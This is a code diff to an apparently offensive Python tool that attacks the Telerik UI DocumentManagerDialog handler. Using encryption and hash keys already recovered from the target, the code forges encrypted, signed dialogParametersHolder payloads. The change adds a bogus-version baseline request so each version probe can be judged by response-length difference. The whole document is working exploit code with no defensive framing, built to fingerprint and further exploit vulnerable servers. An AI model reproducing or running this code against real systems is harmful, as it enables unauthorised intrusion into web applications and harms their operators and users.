@@ -383,19 +383,14 @@ class DialogHandler:
         self.headers = headers
         self.include_machinekeys_bool = include_machinekeys_bool
 
-    def probe_version(self, version):
-        if hasattr(self, "debug") and self.debug:
-            print(f"\n[DEBUG] Probing version: {version}")
-
-        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+    def probe_version_baseline(self):
+        # Get baseline with bogus version
+        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version=9999.9.999, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         b64section = base64.b64encode(b64section_plain.encode()).decode()
 
-        # Critical split between modern (2018+) and legacy dialog parameters
         if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
-            # Modern format (2018+) with additional properties and different paths
             plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
         else:
-            # Legacy format (pre-2018) with original paths and parameters
             plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
 
         derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
@@ -403,10 +398,38 @@ class DialogHandler:
         )
         ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
         dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
-        dialog_parameters_data = {"dialogParametersHolder": dialog_parameters}
-
         r = requests.post(
-            self.url, data=dialog_parameters_data, headers=self.headers, verify=False, proxies=self.proxies
+            self.url,
+            data={"dialogParametersHolder": dialog_parameters},
+            headers=self.headers,
+            verify=False,
+            proxies=self.proxies,
+        )
+        return len(r.text)
+
+    def probe_version(self, version, baseline_size=None):
+        if hasattr(self, "debug") and self.debug:
+            print(f"\n[DEBUG] Probing version: {version}")
+
+        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        b64section = base64.b64encode(b64section_plain.encode()).decode()
+
+        if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
+        else:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
+
+        derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
+            self.encryption_key, self.key_derive_mode
+        )
+        ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
+        dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
+        r = requests.post(
+            self.url,
+            data={"dialogParametersHolder": dialog_parameters},
+            headers=self.headers,
+            verify=False,
+            proxies=self.proxies,
         )
 
         # Extract title if it exists
@@ -418,7 +441,7 @@ class DialogHandler:
 
         print(f"{version} [{r.status_code}]{title}")
 
-        if r.status_code == 200:
+        if baseline_size and abs(len(r.text) - baseline_size) > 10:
             return dialog_parameters
         return None
 
@@ -633,6 +656,8 @@ class DialogHandler:
         print("\n=== PHASE 2: VERSION PROBING ===")
         print("Keys found! Now attempting to find the exact Telerik UI version...")
 
+        baseline_size = self.probe_version_baseline()
+
         versions = []
         for v in telerik_versions + telerik_versions_patched:
             versions.append(v)
@@ -642,7 +667,7 @@ class DialogHandler:
         versions += undotted_versions
 
         for version in versions:
-            dialog_parameters = self.probe_version(version)
+            dialog_parameters = self.probe_version(version, baseline_size)
             if dialog_parameters:
                 self.version = version
                 self.dialog_parameters = dialog_parameters
